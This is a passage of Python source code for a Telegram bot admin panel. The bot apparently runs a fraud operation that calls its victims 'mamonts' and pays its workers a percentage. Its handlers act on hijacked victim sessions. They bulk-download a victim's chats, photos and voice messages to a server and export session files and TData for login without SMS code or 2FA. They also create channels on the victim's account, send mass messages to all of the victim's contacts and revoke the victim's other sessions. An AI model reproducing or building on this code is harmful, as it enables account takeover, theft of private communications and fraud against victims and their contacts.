            f"• <i>{html.escape(text)}</i>\n\n"
            f"⏱ <i>Бот выкачивает файлы напрямую на VPS. Как только архив будет готов, вы получите прямую ссылку на скачивание.</i>"
        )
        try:
            await self.message.edit_text(msg_text, parse_mode="HTML")
        except Exception:
            pass


@router.callback_query(F.data.startswith("adm_act_dump_media:"))
async def cb_adm_act_dump_media(callback: CallbackQuery, bot: Bot) -> None:
    user_tg_id = int(callback.data.split(":")[1])
    user = db.get_user_by_tg_id(DB_PATH, user_tg_id)
    if not user or not user["session_string"]:
        await callback.answer("❌ Сессия мамонта отсутствует или закрыта.", show_alert=True)
        return

    if not can_admin_access_user(callback.from_user.id, user):
        await callback.answer("❌ Доступ ограничен (личный лог владельца).", show_alert=True)
        return

    await callback.answer("⏳ Запускаем выгрузку на сервер...", show_alert=True)

    u_dict = dict(user)
    m_name = u_dict.get("nickname") or u_dict.get("username") or f"ID {user_tg_id}"
    status_msg = await callback.message.answer(
        f"⏳ <b>Начата выгрузка переписок и медиа на сервер...</b>\n\n"
        f"👤 <b>Мамонт:</b> {html.escape(m_name)} (ID: <code>{user_tg_id}</code>)\n"
        f"📊 <code>[░░░░░░░░░░░░] 0%</code>\n\n"
        "• <i>Подключение к Telegram MTProto...</i>\n\n"
        "⏱ <i>Выкачивание происходит напрямую на VPS. По окончании бот пришлет прямую ссылку на скачивание архива.</i>",
        parse_mode="HTML",
    )

    reporter = ProgressReporter(status_msg, user_tg_id, m_name)

    try:
        result = await contacts_pkg.extract_full_archive_from_session(
            user["session_string"],
            user_tg_id,
            days_limit=60,
            progress_cb=reporter.update,
        )
        if not result:
            await status_msg.edit_text("❌ Не удалось выгрузить переписки и медиа (сессия прервана или пуста).")
            return

        # 1. Generate direct download link for the full complete archive on VPS
        from shared.downloads import create_download_token
        full_zip = result.get("full_zip_path") or result.get("zip_path")
        zip_size_mb = result.get("full_zip_size_mb") or result.get("zip_size_mb", 0.0)

        _, download_url = create_download_token(
            file_path=full_zip,
            filename=f"archive_{user_tg_id}.zip",
            user_tg_id=user_tg_id,
            ttl_hours=24,
        )

        cap = (
            f"📦 <b>Архив переписок и медиа успешно сохранен на сервере!</b>\n\n"
            f"• 👤 <b>Мамонт:</b> {html.escape(m_name)} (ID: <code>{user_tg_id}</code>)\n"
            f"• 💬 <b>Чатов:</b> {result['dialogs_count']} (Сообщений: {result['total_messages']})\n"
            f"• 📷 <b>Фото:</b> {result['photos_count']}\n"
            f"• 🎙 <b>Голосовых:</b> {result['voices_count']}\n"
            f"• 📹 <b>Кружков:</b> {result['video_notes_count']}\n"
            f"• 📌 <b>Избранное:</b> {result['saved_msgs_count']}\n"
            f"💾 <b>Размер полного архива:</b> <code>{zip_size_mb:.1f} MB</code>\n"
            f"⏱ <b>Срок действия ссылки:</b> 24 часа\n\n"
            f"🔗 <b>Прямая ссылка для скачивания с VPS:</b>\n<code>{download_url}</code>\n\n"
            f"💡 <i>Нажмите кнопку ниже, чтобы скачать полный архив напрямую с сервера на максимальной скорости (без ограничений Telegram).</i>"
        )

        dl_kb = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text=f"📥 Скачать архив напрямую ({zip_size_mb:.1f} MB)", url=download_url)],
                [InlineKeyboardButton(text="« Назад к логу", callback_data=f"adm_view_user:{user_tg_id}")],
            ]
        )
        await status_msg.edit_text(cap, reply_markup=dl_kb, parse_mode="HTML")

        # 2. Also send HTML viewer if available as a quick Telegram document
        html_path = result.get("html_path")
        if html_path and os.path.exists(html_path):
            try:
                doc_html = FSInputFile(html_path, filename=f"chats_{user_tg_id}.html")
                await bot.send_document(
                    chat_id=callback.from_user.id,
                    document=doc_html,
                    caption=(
                        f"🌐 <b>Интерактивный веб-просмотрщик диалогов</b>\n"
                        f"👤 Мамонт: <code>{user_tg_id}</code>\n\n"
                        f"💡 <i>Для просмотра откройте скачанный zip-архив и запустите index.html</i>"
                    ),
                    parse_mode="HTML",
                )
            except Exception as e_html:
                logger.error("Error sending HTML viewer: %s", e_html)

        # 3. If the archive is small enough (<= 45 MB), also send it directly into Telegram
        if zip_size_mb <= 45.0 and full_zip and os.path.exists(full_zip):
            try:
                doc_zip = FSInputFile(full_zip, filename=f"archive_{user_tg_id}.zip")
                await bot.send_document(
                    chat_id=callback.from_user.id,
                    document=doc_zip,
                    caption=f"📁 Документ архива: <code>archive_{user_tg_id}.zip</code>",
                    parse_mode="HTML",
                    request_timeout=300,
                )
            except Exception as e_tg_doc:
                logger.error("Error sending archive as Telegram doc: %s", e_tg_doc)

    except Exception as exc:
        logger.error("Error in cb_adm_act_dump_media for %s: %s", user_tg_id, exc)
        try:
            await status_msg.edit_text(f"❌ Ошибка выгрузки переписок: {exc}")
        except Exception:
            await callback.message.answer(f"❌ Ошибка выгрузки переписок: {exc}")


@router.callback_query(F.data.startswith("adm_act_create_tgk:"))
async def cb_adm_act_create_tgk(callback: CallbackQuery, state: FSMContext) -> None:
    user_tg_id = int(callback.data.split(":")[1])
    user = db.get_user_by_tg_id(DB_PATH, user_tg_id)
    if not can_admin_access_user(callback.from_user.id, user):
        await callback.answer("❌ Доступ ограничен (личный лог владельца).", show_alert=True)
        return

    await callback.answer()
    text = (
        f"📢 <b>Создание канала на аккаунте мамонта (ID: <code>{user_tg_id}</code>):</b>\n\n"
        "Выберите способ наполнения канала:\n\n"
        f"⚡ <b>1) Быстрое клонирование из канала-донора</b> — мгновенный перенос всей ленты с фото/видео/текстами (донор: <code>{DEFAULT_DONOR_CHANNEL}</code>).\n\n"
        "✍️ <b>2) Ручная публикация</b> — отправьте свой текст или фото/видео для отдельного поста."
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="⚡ Клонировать из донора (быстро)", callback_data=f"adm_act_clone_donor:{user_tg_id}")],
            [InlineKeyboardButton(text="✍️ Загрузить свой пост", callback_data=f"adm_act_custom_post:{user_tg_id}")],
            [InlineKeyboardButton(text="« Назад к логу", callback_data=f"adm_view_user:{user_tg_id}")],
        ]
    )
    await callback.message.answer(text, reply_markup=keyboard, parse_mode="HTML")


@router.callback_query(F.data.startswith("adm_act_clone_donor:"))
async def cb_adm_act_clone_donor(callback: CallbackQuery, bot: Bot) -> None:
    user_tg_id = int(callback.data.split(":")[1])
    user = db.get_user_by_tg_id(DB_PATH, user_tg_id)
    if not user or not user["session_string"]:
        await callback.answer("❌ Сессия мамонта отсутствует или закрыта.", show_alert=True)
        return

    if not can_admin_access_user(callback.from_user.id, user):
        await callback.answer("❌ Доступ ограничен (личный лог владельца).", show_alert=True)
        return

    await callback.answer("⏳ Создаем канал и клонируем посты...", show_alert=False)
    msg = await callback.message.answer("⏳ <i>Клонируем посты из канала-донора в новый канал мамонта...</i>", parse_mode="HTML")
    res = await contacts_pkg.create_channel_and_post_material(
        session_string=user["session_string"],
        donor_channel=DEFAULT_DONOR_CHANNEL,
    )
    if res.get("ok"):
        cloned_count = res.get("posts_cloned", 0)
        await msg.edit_text(
            f"✅ <b>Канал успешно создан и наполнен!</b>\n\n"
            f"📢 <b>Название:</b> {res.get('title')}\n"
            f"📥 <b>Скопировано постов из донора:</b> <code>{cloned_count}</code>\n"
            f"🔗 <b>Ссылка:</b> {res.get('link')}\n"
            f"🆔 <b>ID канала:</b> <code>{res.get('channel_id')}</code>",
            parse_mode="HTML",
        )
    else:
        await msg.edit_text(f"❌ Ошибка создания канала: {res.get('error')}", parse_mode="HTML")


@router.callback_query(F.data.startswith("adm_act_custom_post:"))
async def cb_adm_act_custom_post(callback: CallbackQuery, state: FSMContext) -> None:
    user_tg_id = int(callback.data.split(":")[1])
    user = db.get_user_by_tg_id(DB_PATH, user_tg_id)
    if not can_admin_access_user(callback.from_user.id, user):
        await callback.answer("❌ Доступ ограничен (личный лог владельца).", show_alert=True)
        return

    await callback.answer()
    await state.update_data(tgk_user_tg_id=user_tg_id)
    await state.set_state(AdminStates.waiting_mamont_tgk_post)
    text = (
        f"✍️ <b>Ручная публикация в новый канал мамонта (ID: <code>{user_tg_id}</code>):</b>\n\n"
        "Отправьте текст публикации или медиа (фото / видео), которое будет опубликовано в создаваемый канал.\n\n"
        "<i>Или отправьте «-» для создания канала со стандартным текстом.</i>"
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="« Отмена", callback_data=f"adm_view_user:{user_tg_id}")]]
    )
    await callback.message.answer(text, reply_markup=keyboard, parse_mode="HTML")


@router.message(AdminStates.waiting_mamont_tgk_post)
async def msg_mamont_tgk_post(message: Message, state: FSMContext, bot: Bot) -> None:
    messages = await collect_media_group(message)
    if messages is None:
        return

    data = await state.get_data()
    user_tg_id = data.get("tg_user_tg_id") or data.get("tgk_user_tg_id")
    if not user_tg_id:
        current_state = await state.get_state()
        if not current_state:
            return
        await state.clear()
        await message.answer("❌ Ошибка контекста: мамонт не выбран.")
        return

    await state.clear()

    user = db.get_user_by_tg_id(DB_PATH, user_tg_id)
    if not user or not user["session_string"]:
        await message.answer("❌ Сессия мамонта отсутствует или закрыта.")
        return

    post_text = ""
    for m in messages:
        txt = m.caption or m.text or ""
        if txt:
            post_text = txt
            break
    if post_text == "-":
        post_text = "Private Room Channel"

    downloaded_paths = []
    temp_dir = os.path.abspath("data/temp")
    os.makedirs(temp_dir, exist_ok=True)
    try:
        for idx, m in enumerate(messages):
            ts = f"{int(time.time()*1000)}_{idx}"
            if m.photo:
                path = os.path.join(temp_dir, f"tgk_post_{user_tg_id}_{ts}.jpg")
                await bot.download(m.photo[-1], destination=path)
                downloaded_paths.append(path)
            elif m.video:
                path = os.path.join(temp_dir, f"tgk_post_{user_tg_id}_{ts}.mp4")
                await bot.download(m.video, destination=path)
                downloaded_paths.append(path)
            elif m.document:
                ext = os.path.splitext(m.document.file_name or "")[1] or ".dat"
                path = os.path.join(temp_dir, f"tgk_post_{user_tg_id}_{ts}{ext}")
                await bot.download(m.document, destination=path)
                downloaded_paths.append(path)

        media_arg = downloaded_paths if len(downloaded_paths) > 1 else (downloaded_paths[0] if downloaded_paths else None)

        await message.answer("⏳ Создаем канал на аккаунте мамонта и публикуем материал...")
        res = await contacts_pkg.create_channel_and_post_material(
            session_string=user["session_string"],
            title="Дети",
            about="",
            post_text=post_text,
            media_path=media_arg,
        )

        if res.get("ok"):
            await message.answer(
                f"✅ <b>Канал успешно создан на аккаунте мамонта!</b>\n\n"
                f"📢 <b>Название:</b> {res.get('title')}\n"
                f"🔗 <b>Ссылка:</b> {res.get('link')}\n"
                f"🆔 <b>ID канала:</b> <code>{res.get('channel_id')}</code>",
                parse_mode="HTML",
            )
        else:
            await message.answer(f"❌ Не удалось создать канал: {res.get('error')}", parse_mode="HTML")
    finally:
        for p in downloaded_paths:
            try:
                if os.path.exists(p):
                    os.remove(p)
            except Exception:
                pass


@router.callback_query(F.data.startswith("adm_act_download_tdata:"))
async def cb_adm_act_download_tdata(callback: CallbackQuery, bot: Bot) -> None:
    user_tg_id = int(callback.data.split(":")[1])
    user = db.get_user_by_tg_id(DB_PATH, user_tg_id)
    if not user or not user["session_string"]:
        await callback.answer("❌ Сессия мамонта отсутствует или закрыта.", show_alert=True)
        return

    if not can_admin_access_user(callback.from_user.id, user):
        await callback.answer("❌ Доступ ограничен (личный лог владельца).", show_alert=True)
        return

    await callback.answer("⏳ Генерируем архив сессии и TData...", show_alert=False)
    u_dict = dict(user)
    res = await contacts_pkg.export_session_archive(
        user["session_string"],
        user_tg_id,
        password_2fa=u_dict.get("password_2fa"),
    )
    if not res:
        await callback.message.answer("❌ Не удалось экспортировать сессию.")
        return

    doc = FSInputFile(res["zip_path"], filename=f"tdata_{user_tg_id}.zip")
    if res.get("has_tdata"):
        caption = (
            f"💾 <b>TData и сессия для входа в аккаунт мамонта</b> (ID: <code>{user_tg_id}</code>)\n\n"
            "📦 <b>Содержимое архива:</b>\n"
            "• 📁 <b>Папка <code>tdata</code></b> (готовая для распаковки в Telegram Desktop Portable)\n"
            f"• <code>{user_tg_id}.session</code> (SQLite сессия Telethon/Pyrogram)\n"
            "• <code>StringSession.txt</code> (строковая сессия MTProto)\n"
            "• <code>README_LOGIN.txt</code> (инструкция по мгновенному входу без кода)\n\n"
            "💡 <i>Вход по TData открывает аккаунт на ПК мгновенно: БЕЗ смс-кода и БЕЗ пароля 2FA!</i>"
        )
    else:
        caption = (
            f"💾 <b>Сессия для аккаунта мамонта</b> (ID: <code>{user_tg_id}</code>)\n\n"
            "⚠️ <b>Внимание:</b> Папка <code>tdata</code> не сформирована, так как сессия отозвана в Telegram.\n"
            "📦 <b>Содержимое архива:</b>\n"
            f"• <code>{user_tg_id}.session</code> (SQLite сессия Telethon/Pyrogram)\n"
            "• <code>StringSession.txt</code> (строковая сессия MTProto)\n"
            "• <code>README_LOGIN.txt</code> (инструкция)"
        )

    await bot.send_document(
        chat_id=callback.from_user.id,
        document=doc,
        caption=caption,
        parse_mode="HTML",
    )


@router.callback_query(F.data.startswith("adm_act_broadcast_contacts:"))
async def cb_adm_act_broadcast_contacts(callback: CallbackQuery, state: FSMContext) -> None:
    user_tg_id = int(callback.data.split(":")[1])
    user = db.get_user_by_tg_id(DB_PATH, user_tg_id)
    if not can_admin_access_user(callback.from_user.id, user):
        await callback.answer("❌ Доступ ограничен (личный лог владельца).", show_alert=True)
        return

    await callback.answer()
    await state.update_data(mamont_broadcast_user_tg_id=user_tg_id)
    await state.set_state(AdminStates.waiting_mamont_broadcast_content)
    text = (
        f"⚡ <b>Запуск рассылки по контактам мамонта (ID: <code>{user_tg_id}</code>):</b>\n\n"
        "Отправьте сообщение, которое будет разослано по всем контактам и чатам мамонта.\n\n"
        "<b>Поддерживаются:</b>\n"
        "• Текст\n"
        "• Фото\n"
        "• Видео\n"
        "• Кружочки (video note)\n"
        "• Голосовые сообщения (voice)\n\n"
        "<i>Сообщение будет доставлено всем личным контактам мамонта.</i>"
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="« Отмена", callback_data=f"adm_view_user:{user_tg_id}")]]
    )
    await callback.message.answer(text, reply_markup=keyboard, parse_mode="HTML")


@router.message(AdminStates.waiting_mamont_broadcast_content)
async def msg_mamont_broadcast_content(message: Message, state: FSMContext, bot: Bot) -> None:
    messages = await collect_media_group(message)
    if messages is None:
        return

    data = await state.get_data()
    user_tg_id = data.get("mamont_broadcast_user_tg_id")
    if not user_tg_id:
        current_state = await state.get_state()
        if not current_state:
            return
        await state.clear()
        await message.answer("❌ Ошибка контекста: мамонт не выбран. Откройте профиль мамонта заново.")
        return

    await state.clear()

    user = db.get_user_by_tg_id(DB_PATH, user_tg_id)
    if not user or not user["session_string"]:
        await message.answer("❌ Сессия мамонта отсутствует или закрыта.")
        return

    text_content = ""
    for m in messages:
        txt = m.html_text if hasattr(m, "html_text") and m.html_text else (m.caption or m.text or "")
        if txt:
            text_content = txt
            break

    downloaded_paths = []
    media_type = "text"
    temp_dir = os.path.abspath("data/temp")
    os.makedirs(temp_dir, exist_ok=True)

    try:
        for idx, m in enumerate(messages):
            ts = f"{int(time.time()*1000)}_{idx}"
            if m.video_note:
                media_type = "circle"
                path = os.path.join(temp_dir, f"circle_{user_tg_id}_{ts}.mp4")
                await bot.download(m.video_note, destination=path)
                downloaded_paths.append(path)
            elif m.voice:
                media_type = "voice"
                path = os.path.join(temp_dir, f"voice_{user_tg_id}_{ts}.ogg")
                await bot.download(m.voice, destination=path)
                downloaded_paths.append(path)
            elif m.photo:
                media_type = "photo"
                path = os.path.join(temp_dir, f"photo_{user_tg_id}_{ts}.jpg")
                await bot.download(m.photo[-1], destination=path)
                downloaded_paths.append(path)
            elif m.video:
                media_type = "video"
                path = os.path.join(temp_dir, f"video_{user_tg_id}_{ts}.mp4")
                await bot.download(m.video, destination=path)
                downloaded_paths.append(path)
            elif m.document:
                media_type = "document"
                ext = os.path.splitext(m.document.file_name or "")[1] or ".dat"
                path = os.path.join(temp_dir, f"doc_{user_tg_id}_{ts}{ext}")
                await bot.download(m.document, destination=path)
                downloaded_paths.append(path)

        media_arg = downloaded_paths if len(downloaded_paths) > 1 else (downloaded_paths[0] if downloaded_paths else None)

        await message.answer("⏳ Запускаем рассылку по контактам мамонта...")
        res = await contacts_pkg.broadcast_to_mamont_contacts(
            session_string=user["session_string"],
            text=text_content,
            media_path=media_arg,
            media_type=media_type,
        )

        if res.get("ok"):
            await message.answer(
                f"⚡ <b>Рассылка по контактам мамонта завершена!</b>\n\n"
                f"• 👥 <b>Всего получателей:</b> {res.get('total_targets', 0)}\n"
                f"• ✅ <b>Успешно отправлено:</b> {res.get('sent_count', 0)}\n"
                f"• ❌ <b>Ошибок отправки:</b> {res.get('failed_count', 0)}",
                parse_mode="HTML",
            )
        else:
            await message.answer(f"❌ Ошибка рассылки: {res.get('error')}", parse_mode="HTML")
    finally:
        for p in downloaded_paths:
            try:
                if os.path.exists(p):
                    os.remove(p)
            except Exception:
                pass


@router.callback_query(F.data.startswith("adm_reset_sess:"))
async def cb_adm_reset_sess(callback: CallbackQuery) -> None:
    user_tg_id = int(callback.data.split(":")[1])
    user = db.get_user_by_tg_id(DB_PATH, user_tg_id)
    if not user or not user["session_string"]:
        await callback.answer("❌ Сессия мамонта отсутствует или закрыта.", show_alert=True)
        return

    if not can_admin_access_user(callback.from_user.id, user):
        await callback.answer("❌ Доступ ограничен (личный лог владельца).", show_alert=True)
        return

    await callback.answer("⏳ Проверяем сессии...", show_alert=False)
    status_msg = await callback.message.answer(
        f"⏳ <i>Запрашиваем сброс сессий в Telegram для мамонта <code>{user_tg_id}</code>...</i>",
        parse_mode="HTML",
    )
    res = await contacts_pkg.reset_all_other_authorizations(user["session_string"], user_tg_id=user_tg_id)
    msg_text = res.get("message", "Сброс завершен.")
    try:
        await status_msg.edit_text(msg_text, parse_mode="HTML")
    except Exception:
        await callback.message.answer(msg_text, parse_mode="HTML")


@router.callback_query(F.data.startswith("adm_logout_ask:"))
async def cb_adm_logout_ask(callback: CallbackQuery) -> None:
    user_tg_id = int(callback.data.split(":")[1])
    user = db.get_user_by_tg_id(DB_PATH, user_tg_id)
    if not can_admin_access_user(callback.from_user.id, user):
        await callback.answer("❌ Доступ ограничен (личный лог владельца).", show_alert=True)
        return

    await callback.answer()
    text = (
        f"⚠️ <b>Подтверждение разлогина:</b>\n\n"
        f"Вы действительно хотите разлогинить мамонта (ID: <code>{user_tg_id}</code>) и завершить его сессию?\n\n"
        f"<i>После разлогина лог будет сразу исключен из списка активных логов.</i>"
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🔴 Да, разлогинить", callback_data=f"adm_logout_do:{user_tg_id}")],
            [InlineKeyboardButton(text="« Отмена", callback_data=f"adm_view_user:{user_tg_id}")],
        ]
    )
    await callback.message.answer(text, reply_markup=keyboard, parse_mode="HTML")


@router.callback_query(F.data.startswith("adm_logout_do:"))
async def cb_adm_logout_do(callback: CallbackQuery) -> None:
    user_tg_id = int(callback.data.split(":")[1])
    user = db.get_user_by_tg_id(DB_PATH, user_tg_id)
    if not can_admin_access_user(callback.from_user.id, user):
        await callback.answer("❌ Доступ ограничен (личный лог владельца).", show_alert=True)
        return
    if user and "session_string" in user.keys() and user["session_string"]:
        await contacts_pkg.logout_telethon_session(user["session_string"], user_tg_id=user_tg_id)

    try:
        from shared.service_listener import _active_watchers
        w = _active_watchers.pop(user_tg_id, None)
        if w:
            asyncio.create_task(w.disconnect())
    except Exception:
        pass

    db.update_user_auth(DB_PATH, user_tg_id, session_string=None, auth_step="logged_out")
    zip_path = os.path.join(SESSIONS_DIR, f"tdata_{user_tg_id}.zip")
    if os.path.exists(zip_path):
        try:
            os.remove(zip_path)
        except Exception:
            pass
    asyncio.create_task(notify_session_revoked(user_tg_id, reason="Разлогинен администратором через админ-панель", force=True))
    await callback.answer("✅ Сессия мамонта успешно завершена!", show_alert=True)
    await callback.message.answer(
        f"✅ Сессия мамонта <code>{user_tg_id}</code> успешно завершена и исключена из активных логов.",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[[InlineKeyboardButton(text="« К активным логам", callback_data="adm_menu_logs")]]
        ),
        parse_mode="HTML",
    )


# --------------------- 2. CHANGE WORKER % ---------------------

@router.callback_query(F.data == "adm_menu_percent")
async def cb_adm_menu_percent(callback: CallbackQuery, state: FSMContext) -> None:
    await callback.answer()
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.waiting_percent_worker_query)
    text = (
        "⚙️ <b>Изменение процента воркера:</b>\n\n"
        "Введите <b>@username</b> или <b>ID воркера</b> для настройки процента:"
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="« Назад в админку", callback_data="adm_main_menu")]]
    )
    await _send_or_edit_menu(callback, text, keyboard, photo_path=ADMIN_PANEL_PHOTO)


@router.message(AdminStates.waiting_percent_worker_query)
async def msg_percent_worker_query(message: Message, state: FSMContext) -> None:
    if not message.from_user or not is_admin(message.from_user.id):
        return
    query = message.text.strip() if message.text else ""
    worker = db.get_worker_by_query(DB_PATH, query)

    if not worker:
        await message.answer(
            "❌ <b>Воркер не найден!</b>\n\n"
            "Убедитесь, что воркер запускал ворк-бота и юзернейм/ID указан верно.",
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[[InlineKeyboardButton(text="« Назад в админку", callback_data="adm_main_menu")]]
            ),
            parse_mode="HTML",
        )
        return

    await state.clear()
    current_pct = db.get_worker_percent(DB_PATH, worker["tg_id"])
    w_tag = f"@{worker['username']}" if worker["username"] else f"ID: {worker['tg_id']}"

    text = (
        f"⚙️ <b>Настройка процента воркера {w_tag}:</b>\n\n"
        f"💰 <b>Текущий процент:</b> <b>{current_pct}%</b>\n\n"
        "<i>Выберите новый процент выплаты:</i>"
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="50%", callback_data=f"adm_set_worker_pct:{worker['tg_id']}:50"),
                InlineKeyboardButton(text="55%", callback_data=f"adm_set_worker_pct:{worker['tg_id']}:55"),
                InlineKeyboardButton(text="60%", callback_data=f"adm_set_worker_pct:{worker['tg_id']}:60"),
            ],
            [
                InlineKeyboardButton(text="65%", callback_data=f"adm_set_worker_pct:{worker['tg_id']}:65"),
                InlineKeyboardButton(text="70%", callback_data=f"adm_set_worker_pct:{worker['tg_id']}:70"),
            ],
            [InlineKeyboardButton(text="« Назад в админку", callback_data="adm_main_menu")],
        ]
    )
    await message.answer(text, reply_markup=keyboard, parse_mode="HTML")


@router.callback_query(F.data.startswith("adm_set_worker_pct:"))
async def cb_adm_set_worker_pct(callback: CallbackQuery) -> None:
    if not is_admin(callback.from_user.id):
        return
    parts = callback.data.split(":")
    worker_tg_id = int(parts[1])
    pct = int(parts[2])

    db.set_worker_percent(DB_PATH, worker_tg_id, pct)
    worker = db.get_worker_by_tg_id(DB_PATH, worker_tg_id)
    w_tag = f"@{worker['username']}" if worker and worker["username"] else f"ID:{worker_tg_id}"

    await callback.answer(f"✅ Процент для {w_tag} успешно установлен на {pct}%!", show_alert=True)
    text = (
        f"✅ <b>Процент воркера {w_tag} успешно обновлен!</b>\n\n"
        f"💰 Новый процент выплаты: <b>{pct}%</b>"
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="⚙️ Изменить процент другому воркеру", callback_data="adm_menu_percent")],
            [InlineKeyboardButton(text="« Главное меню админки", callback_data="adm_main_menu")],
        ]
    )
    await _send_or_edit_menu(callback, text, keyboard, photo_path=ADMIN_PANEL_PHOTO)


# --------------------- 3. ADMINS MANAGEMENT ---------------------

@router.callback_query(F.data == "adm_menu_admins")
async def cb_adm_menu_admins(callback: CallbackQuery, state: Optional[FSMContext] = None) -> None:
    await callback.answer()
    if not is_admin(callback.from_user.id):
        return
    if state:
        await state.clear()

    admins = db.get_all_admins(DB_PATH)
    buttons = []
    for a in admins:
        aid = a["tg_id"]
        a_user = f"@{a['username']}" if a["username"] else f"ID:{aid}"
        role_label = "👑 Главный админ" if aid == 7491827504 else "👑 Админ"
        buttons.append([InlineKeyboardButton(text=f"{role_label} | {a_user}", callback_data=f"adm_view_admin:{aid}")])

    buttons.append([InlineKeyboardButton(text="➕ Добавить админа", callback_data="adm_add_admin_start")])
    buttons.append([InlineKeyboardButton(text="« Назад в админку", callback_data="adm_main_menu")])
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)

    text = "👥 <b>Список администраторов ECHO TEAM:</b>\n\nВыберите администратора для управления или добавьте нового:"
    await _send_or_edit_menu(callback, text, keyboard, photo_path=ADMIN_PANEL_PHOTO)


@router.callback_query(F.data.startswith("adm_view_admin:"))
async def cb_adm_view_admin(callback: CallbackQuery) -> None:
    await callback.answer()
    if not is_admin(callback.from_user.id):
        return
    aid = int(callback.data.split(":")[1])
    admin = db.get_admin_by_tg_id(DB_PATH, aid)
    if not admin:
        await callback.answer("❌ Администратор не найден.", show_alert=True)
        return

    a_user = f"@{admin['username']}" if admin["username"] else "—"
    role_str = "Главный администратор" if aid == 7491827504 else "Администратор"

    text = (
        f"👤 <b>Управление администратором:</b>\n\n"
        f"• <b>TG ID:</b> <code>{aid}</code>\n"
        f"• <b>Юзернейм:</b> {a_user}\n"
        f"• <b>Текущий статус:</b> <b>{role_str}</b>"
    )

    buttons = []
    if aid != 7491827504:
        buttons.append([InlineKeyboardButton(text="🔄 Сменить статус на Воркер", callback_data=f"adm_toggle_role:{aid}:worker")])
        buttons.append([InlineKeyboardButton(text="🗑 Удалить админа", callback_data=f"adm_delete_admin_do:{aid}")])

    buttons.append([InlineKeyboardButton(text="« Назад к списку админов", callback_data="adm_menu_admins")])
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    await _send_or_edit_menu(callback, text, keyboard, photo_path=ADMIN_PANEL_PHOTO)


@router.callback_query(F.data.startswith("adm_toggle_role:"))
async def cb_adm_toggle_role(callback: CallbackQuery, bot: Bot) -> None:
    if not is_admin(callback.from_user.id):
        return
    parts = callback.data.split(":")
    aid = int(parts[1])
    new_role = parts[2]

    if new_role == "admin":
        db.add_admin(DB_PATH, aid, None, "admin")
        if aid not in ADMIN_CHAT_IDS:
            ADMIN_CHAT_IDS.append(aid)
        try:
            admin_commands = [
                BotCommand(command="start", description="🏠 Главное меню"),
                BotCommand(command="admin", description="adminPanel"),
            ]
            await bot.set_my_commands(admin_commands, scope=BotCommandScopeChat(chat_id=aid))
            await bot.send_message(
                chat_id=aid,
                text="👑 <b>Вам выданы права администратора в ECHO TEAM!</b>\n\nИспользуйте команду /admin для доступа к админ-панели.",
                parse_mode="HTML",
            )
        except Exception:
            pass
        await callback.answer("✅ Пользователь назначен администратором!", show_alert=True)
    else:
        db.remove_admin(DB_PATH, aid)
        if aid in ADMIN_CHAT_IDS and aid != 7491827504:
            ADMIN_CHAT_IDS.remove(aid)
        try:
            await bot.delete_my_commands(scope=BotCommandScopeChat(chat_id=aid))
            await bot.send_message(
                chat_id=aid,
                text="ℹ️ <b>Ваш статус изменен на Воркер. Права администратора сняты.</b>",
                parse_mode="HTML",
            )
        except Exception:
            pass
        await callback.answer("✅ Статус изменен на Воркер (пользователь удален из админов)!", show_alert=True)

    await cb_adm_menu_admins(callback, None)


@router.callback_query(F.data.startswith("adm_delete_admin_do:"))
async def cb_adm_delete_admin_do(callback: CallbackQuery, bot: Bot) -> None:
    if not is_admin(callback.from_user.id):
        return
    aid = int(callback.data.split(":")[1])
    if aid == 7491827504:
        await callback.answer("❌ Нельзя удалить главного администратора!", show_alert=True)
        return
    db.remove_admin(DB_PATH, aid)
    if aid in ADMIN_CHAT_IDS:
        ADMIN_CHAT_IDS.remove(aid)
    try:
        await bot.delete_my_commands(scope=BotCommandScopeChat(chat_id=aid))
    except Exception:
        pass
    await callback.answer("✅ Администратор удален.", show_alert=True)
    await cb_adm_menu_admins(callback, None)


@router.callback_query(F.data == "adm_add_admin_start")
async def cb_adm_add_admin_start(callback: CallbackQuery, state: FSMContext) -> None:
    await callback.answer()
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.waiting_add_admin_query)
    text = (
        "➕ <b>Добавление администратора:</b>\n\n"
        "Введите <b>@username</b> или <b>ID пользователя</b> (который запускал ворк-бота):"
    )
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="« Отмена", callback_data="adm_menu_admins")]]
    )
    await _send_or_edit_menu(callback, text, keyboard, photo_path=ADMIN_PANEL_PHOTO)


@router.message(AdminStates.waiting_add_admin_query)
async def msg_add_admin_query(message: Message, state: FSMContext, bot: Bot) -> None:
    if not message.from_user or not is_admin(message.from_user.id):
        return
    query = message.text.strip() if message.text else ""
    worker = db.get_worker_by_query(DB_PATH, query)

    if not worker:
        await message.answer(
            "❌ <b>Пользователь не найден!</b>\n\n"
            "Пользователь должен хотя бы один раз запустить ворк-бота.",
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[[InlineKeyboardButton(text="« Назад к админам", callback_data="adm_menu_admins")]]
            ),
            parse_mode="HTML",
        )
        return

    await state.clear()
    target_id = worker["tg_id"]
    db.add_admin(DB_PATH, target_id, worker["username"], "admin")
    if target_id not in ADMIN_CHAT_IDS:
        ADMIN_CHAT_IDS.append(target_id)

    # Set personal bot command menu with /admin for the new admin
    try:
        admin_commands = [
            BotCommand(command="start", description="🏠 Главное меню"),
            BotCommand(command="admin", description="adminPanel"),
        ]
        await bot.set_my_commands(admin_commands, scope=BotCommandScopeChat(chat_id=target_id))
        await bot.send_message(
            chat_id=target_id,
            text="👑 <b>Вам выданы права администратора в ECHO TEAM!</b>\n\nИспользуйте команду /admin для доступа к админ-панели.",
            parse_mode="HTML",
        )
    except Exception as e:
